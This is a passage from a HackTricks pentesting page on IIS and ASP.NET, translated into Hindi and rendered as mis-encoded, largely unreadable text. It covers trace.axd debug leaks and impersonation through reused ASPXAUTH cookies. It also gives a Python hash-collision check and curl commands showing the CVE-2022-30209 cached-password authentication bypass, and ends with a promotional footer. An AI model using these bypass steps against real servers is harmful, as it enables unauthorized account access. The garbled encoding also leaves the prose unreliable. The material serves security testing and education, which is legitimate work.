рдЖрдк рдЗрд╕ **рд╡рд░реНрдирд░рдмрд┐рд▓рд┐рдЯреА** рдФрд░ рдкрд┐рдЫрд▓реА рд╡рд░реНрдирд░рдмрд┐рд▓рд┐рдЯреА рдХреЛ рдорд┐рд▓рд╛рдХрд░ рдирдП **рдлрд╝реЛрд▓реНрдбрд░** рдЦреЛрдЬрдиреЗ рдФрд░ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## ASP.NET Trace.AXD рд╕рдХреНрд╖рдо рдбреАрдмрдЧрд┐рдВрдЧ

ASP.NET рдореЗрдВ рдПрдХ рдбреАрдмрдЧрд┐рдВрдЧ рдореЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдлрд╝рд╛рдЗрд▓ рдирд╛рдо `trace.axd` рд╣реИред

рдпрд╣ рд╕рдордпрд╛рд╡рдзрд┐ рдХреЗ рджреМрд░рд╛рди рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХрд┐рдП рдЧрдП рд╕рднреА рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдПрдХ рдмрд╣реБрдд рд╡рд┐рд╕реНрддреГрдд рд▓реЙрдЧ рд░рдЦрддрд╛ рд╣реИред

рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рджреВрд░рд╕реНрде рдЧреНрд░рд╛рд╣рдХ рдЖрдИрдкреА, рд╕рддреНрд░ рдЖрдИрдбреА, рд╕рднреА рдЕрдиреБрд░реЛрдз рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреБрдХреАрдЬрд╝, рднреМрддрд┐рдХ рдкрде, рд╕реНрд░реЛрдд рдХреЛрдб рдЬрд╛рдирдХрд╛рд░реА, рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдХреНрддрд╛ рдирд╛рдореЛрдВ рдХреЛ рднреА рд╢рд╛рдорд┐рд▓ рдХрд░ рд╕рдХрддреА рд╣реИред

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH рдХреБрдХреА

ASPXAUTH рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`validationKey`** (рд╕реНрдЯреНрд░рд┐рдВрдЧ): рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдХреБрдВрдЬреА рдХреЛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╡реИрдзрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* **`decryptionMethod`** (рд╕реНрдЯреНрд░рд┐рдВрдЧ): (рдбрд┐рдлрд╝реЙрд▓реНрдЯ тАЬAESтАЭ)ред
* **`decryptionIV`** (рд╕реНрдЯреНрд░рд┐рдВрдЧ): рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рд╡реЗрдХреНрдЯрд░ (рдЬреАрд░реЛрдЬрд╝ рдХрд╛ рдПрдХ рд╡реЗрдХреНрдЯрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ)ред
* **`decryptionKey`** (рд╕реНрдЯреНрд░рд┐рдВрдЧ): рдбрд┐рдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЗрдХреНрд╕-рдПрдиреНрдХреЛрдбреЗрдб рдХреБрдВрдЬреАред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рд▓реЛрдЧ рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдФрд░ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЛ **рдХреБрдХреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдЙрд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ ASPXAUTH рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИ рдФрд░ рдЖрдк рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрдХреНрд░рдордг рд╣реЛ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдкрд░ рдЙрд╕ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рдЙрдкрдпреЛрдХреНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдореЗрдВ рджреВрд╕рд░реЗ рд╕рд░реНрд╡рд░ рд╕реЗ рдХреБрдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдХреНрддрд╛ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдпрд╣ рд╣рдорд▓рд╛ рдЗрд╕ [**рд▓реЗрдЦрди**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) рдореЗрдВ рдХрд╛рдордпрд╛рдм рд░рд╣рд╛ред

## IIS рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб (CVE-2022-30209) <a href="#3-iis-authentication-bypass" id="3-iis-authentication-bypass"></a>

[рдкреВрд░реА рд░рд┐рдкреЛрд░реНрдЯ рдпрд╣рд╛рдБ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): рдХреЛрдб рдореЗрдВ рдПрдХ рдмрдЧ рдиреЗ **рдЙрдкрдпреЛрдХреНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреА рд╕рд╣реА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА**, рдЗрд╕рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЬрд┐рд╕рдХрд╛ **рдкрд╛рд╕рд╡рд░реНрдб рд╣реИрд╢ рдПрдХ рдХреБрдВрдЬреА рдХреЛ рд╣рд┐рдЯ рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА **рдХреИрд╢** рдореЗрдВ рд╣реИ, рдЙрд╕ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХреЗрдЧрд╛ред
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
